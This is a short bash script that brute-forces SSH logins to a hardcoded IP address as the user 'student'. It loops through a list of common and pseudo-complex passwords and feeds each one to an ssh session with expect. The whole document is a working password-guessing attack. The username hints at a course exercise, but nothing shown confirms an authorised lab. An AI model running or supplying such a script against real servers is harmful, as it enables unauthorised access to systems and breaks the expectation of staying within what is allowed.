#!/usr/bin/env bash

# Server and username
server="34.83.39.241"
username="student"

passwords=("123456" "password" "123456789" "12345678" "12345" "qwerty" "abc123" "football" "123123" "monkey" "letmein" "dragon" "111111" "baseball" "iloveyou" "sunshine" "trustno1" "princess" "admin" "welcome" "1234" "login" "666666" "qwerty123" "1q2w3e4r" "password1" "zaq12wsx" "qazwsx" "michael" "superman" "bailey" "hunter" "shadow" "Ashley" "bailey" "P@ssw0rd!234" "S3cur3P@$$w0rd" "MyC0mpl3xP@ss!" "StrongP@ss1234" "C0mplic@t3dP@ss" "H@rdToGu3$$123" "R@nd0mP@$$W0rd" "Unbr3@k@bl3P@ss" "S@f3tyF1rst2024" "S3cur1tyM@tt3rs!" "123456" "password" "123456789" "12345678" "12345" "qwerty" "abc123" "football")

# Loop over passwords and SSH into the server
for password in "${passwords[@]}"; do
  echo "Connecting to $server with password $password"
  expect -c "
  spawn ssh $username@$server
  expect \"*password:\"
  send \"$password\r\"
  interact
  "
done
